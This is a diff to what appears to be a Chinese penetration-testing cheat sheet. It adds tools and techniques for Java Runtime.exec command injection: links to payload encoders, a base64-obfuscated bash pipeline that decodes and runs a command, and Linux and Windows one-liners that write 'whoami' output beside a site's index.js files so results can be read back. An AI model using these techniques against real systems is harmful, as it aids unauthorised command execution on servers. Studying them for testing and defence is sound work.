@@ -61,9 +61,25 @@ Table of Contents
 - [cs大全](#cs%E5%A4%A7%E5%85%A8)
 
 # java命令执行
-http://www.jackson-t.ca/runtime-exec-payloads.html
+http://www.jackson-t.ca/runtime-exec-payloads.html 已不能访问，使用如下网址代替   
+https://ares-x.com/tools/runtime-exec/    
+https://r0yanx.com/tools/java_exec_encode/    
+https://www.bugku.net/runtime-exec-payloads/   
+
+手动操作  
 ```
 bash -c {echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==}|{base64,-d}|{bash,-i}
+```
+
+## 命令执行，定位资源文件写文件回显
+Linux
+```
+find /|grep index.js|while read f;do sh -c "whoami" >$(dirname $f)/test.txt;done
+```
+Windows(注意盘符)
+```
+for /r D:\ %i in (index.js*) do whoami > %i/../test.txt
+
 ```
 
 
